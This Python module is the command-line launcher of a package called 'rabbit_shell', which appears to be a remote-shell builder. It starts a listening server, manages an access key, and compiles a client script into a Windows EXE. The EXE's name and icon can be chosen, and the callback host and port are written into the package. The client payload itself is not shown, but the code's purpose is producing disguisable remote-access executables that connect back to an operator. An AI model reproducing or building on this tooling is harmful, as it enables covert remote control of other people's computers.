"""from . import data, about, basic, editor, generate, fixed_path, clear, banner"""
import sys

from .data import data
from .background import editor
from .background import generate
from .background.backstuff import fixed_path, clear
from .data import about, basic
from .data.banners import banner
from .auther.auther import Auther
import argparse
import rabbit_shell
import os
class main:

    def __init__(self):



        parser = argparse.ArgumentParser()
        parser.add_argument("--server", action="store_true", help="server")
        parser.add_argument("--client", action="store_true", help="client")
        parser.add_argument("--auth", action="store_true", help="author")
        parser.add_argument("--key", action="store_true", help="author key")
        parser.add_argument("-a", "--host", help="Server host")
        parser.add_argument("-n", "--name", help="EXE name")
        parser.add_argument("-p", "--port", help="Server port")
        parser.add_argument("-i", "--icon", help="EXE icon path")
        parser.add_argument("-k", "--inkey", help="input author key")
        args = parser.parse_args()


        if args.key:

            if args.inkey:
                editor.edit_basicvar(f"{os.path.dirname(rabbit_shell.__file__)}/data/basic.py", "KEY", str(args.inkey))
                print(f"Inserted key: {args.inkey}")

            else:
                choice = input("[1] generate new key.\n[2] insert new key.\n[3] show current key.\n>:  ")

                if int(choice) == 1:

                    vald = input("making sure you want to generate [y/n]: ")

                    if vald == "y":
                        key = self.new_key()
                        print(f"New key: {key}")

                    else:
                        print("process stopped..")

                elif int(choice) == 2:

                    insert_key = input("insert key: ")
                    editor.edit_basicvar(f"{os.path.dirname(rabbit_shell.__file__)}/data/basic.py", "KEY", insert_key)
                    print(f"Inserted key: {args.inkey}")

                elif int(choice) == 3:
                    print(f"current key: {basic.KEY}")


        elif args.server or args.client or args.auth:


            if not args.host:
                host = basic.HOST
            else:
                host = args.host


            if not args.port:
                port = basic.PORT
            else:
                port = args.port
        else:
            self.help_break(parser, message_type="ERROR", message="Found nor server or client options")


        if args.server:

            self.edit(host, port)
            self.run_server(host, port)


        elif args.auth:
            if args.inkey:
                key = args.inkey

            elif len(basic.KEY) == 0:
                key = self.new_key()
            else:
                key = basic.KEY
            self.run_auther(host, port, key)


        elif args.client:

            if len(basic.KEY) == 0:
                self.new_key()

            if args.name:
                editor.edit_basicvar(f"{os.path.dirname(rabbit_shell.__file__)}/data/data.py", "CLIENT_NAME", args.name)
                name = args.name
            else:
                name = data.CLIENT_NAME

            self.edit(host, port)

            print("Generating client exe please wait...")


            if args.icon:
                res = self.generate_client(name, args.icon)
            else:
                res = self.generate_client(name, fixed_path(data.DEFAULT_ICON))
            if res == 0:
                print("Done generating client exe, check 'dist' folder.")
            else:
                print("Failed to generate.")

    def new_key(self):
        key = generate.generator().genlogkey()
        editor.edit_basicvar(f"{os.path.dirname(rabbit_shell.__file__)}/data/basic.py", "KEY", key)
        return key

    def help_break(self, parser, message_type=False, message=False, host="HOST", port="PORT"):
        mbanner = banner.main_banner(host=host, port=port, version=about.__version__, name=about.__name__)
        print(mbanner)
        print(f"{message_type}: {message}")
        print("<<======== HELP =========>>")
        parser.print_help()
        sys.exit(0)

        parser.print_help()

    def run_auther(self, host: str, port: int, key):
        mbanner = banner.main_banner(host, port, about.__version__, about.__name__)
        clear()
        print(mbanner)
        c = Auther(str(host), int(port), key)
        c.runtime()
    def run_server(self, host: str, port: int):


        mbanner = banner.main_banner(host, port, about.__version__, about.__name__)
        clear()
        print(mbanner)
        from rabbit_shell.server.server import server
        server = server(str(host), int(port))
        server.main()

    def generate_client(self, name, icon):
        generator = generate.generator()
        path = f"{os.path.dirname(rabbit_shell.__file__)}\\client\\client.py"
        return generator.to_exe(fixed_path(path), name, icon)




    def edit(self, host: str, port: str):
        editor.edit_basicvar(f"{os.path.dirname(rabbit_shell.__file__)}/data/basic.py", "HOST", host)
        editor.edit_basicvar(f"{os.path.dirname(rabbit_shell.__file__)}/data/basic.py", "PORT", int(port))
        return
if __name__ == "__main__":

    main()
